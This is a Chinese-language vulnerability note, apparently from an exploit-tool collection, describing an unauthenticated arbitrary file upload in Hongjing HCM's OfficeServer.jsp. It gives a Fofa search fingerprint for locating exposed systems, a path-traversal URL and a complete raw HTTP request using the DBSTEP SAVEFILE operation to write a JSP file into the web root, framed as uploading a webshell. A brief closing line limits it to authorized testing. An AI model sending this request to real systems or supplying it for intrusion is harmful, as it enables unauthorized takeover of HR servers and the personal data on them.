---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM OfficeServer.jsp 任意文件上传漏洞

## 漏洞描述

宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp` 接口存在 DBSTEP 协议任意文件上传漏洞。经 oauthservlet 目录穿越未授权访问，SAVEFILE 操作可写入 JSP 木马。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

DBSTEP V3.0 协议请求（`OPTION` 字段的 base64 `U0FWRUZJTEU=` 即 `SAVEFILE`）：

```
POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=----

DBSTEP V3.0
OPTION=U0FWRUZJTEU=
currentUserId=...
RECOR1DID=...
FILENAME=shell.jsp
Content-Disposition: form-data; name="file"; filename="shell.jsp"

<% out.println("test"); %>
```

`FILENAME` 指定写入的 JSP 文件名，SAVEFILE 动作将其写入 Web 目录；上传成功响应包含成功标识，随后访问写入路径即可执行。工具 PoC 中上传失败/成功分别有明确回显判断（"webshell上传成功"）。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
